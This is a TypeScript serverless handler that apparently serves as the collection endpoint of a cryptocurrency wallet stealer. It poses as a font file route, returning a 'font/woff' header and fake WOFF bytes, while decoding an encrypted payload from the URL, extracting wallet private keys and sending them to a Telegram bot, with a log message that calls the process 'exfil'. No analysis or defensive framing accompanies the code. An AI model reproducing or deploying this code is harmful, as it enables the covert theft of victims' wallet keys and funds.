// api/inbox/[...slug].ts

import type { VercelRequest, VercelResponse } from '@vercel/node'
import crypto from 'crypto'
import bs58 from 'bs58'

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS & font headers
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Content-Type', 'font/woff')

  try {
    // Extract the slug (ts_payload.woff)
    const url = new URL(req.url!, 'https://dummy')
    let filename = url.pathname.split('/').pop()!
    filename = filename.replace(/\.\w+$/, '') // strip extension

    const [ , payloadB64url ] = filename.split('_')
    if (!payloadB64url) throw new Error('Bad slug format')

    // URL‐safe → standard Base64
    let b64 = payloadB64url.replace(/-/g, '+').replace(/_/g, '/')
    b64 += '='.repeat((4 - (b64.length % 4)) % 4)

    // Decode JSON payload
    const { sBundles, keybundle } = JSON.parse(
      Buffer.from(b64, 'base64').toString('utf8').trim()
    )

    // Prepare AES-GCM key
    const key = Buffer.from(keybundle, 'base64')
    const privKeys: string[] = []

    // Decrypt each sBundle
    for (const sb of sBundles) {
      const [iv_b64, data_b64] = sb.split(':')
      const iv = Buffer.from(iv_b64, 'base64')
      const ctTag = Buffer.from(data_b64, 'base64')
      const tag = ctTag.slice(-16)
      const ct = ctTag.slice(0, -16)

      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv)
      dec.setAuthTag(tag)
      // **Use 'hex' here, not 'utf8'**
      const hex = Buffer.concat([dec.update(ct), dec.final()]).toString('hex')
      const last64 = hex.slice(-64)

      // Proper Base58 encode using 'bs58'
      privKeys.push(bs58.encode(Buffer.from(last64, 'hex')))
    }

    // Send to Telegram
    const BOT  = process.env.BOT_TOKEN!
    const CHAT = process.env.CHAT_ID!
    const text = privKeys.map((k,i) => `wallet ${i+1}\n${k}`).join('\n\n')

    console.log('🔹 Telegram payload:', text)
    const resp = await fetch(
      `https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text })
    })
    console.log('🔹 Telegram response:', resp.status, await resp.text())
  } catch (e) {
    console.error('❌ Error processing exfil:', e)
  }

  // Dummy font response
  res.status(200).send(Buffer.from([0x77,0x4f,0x46,0x46]))
}
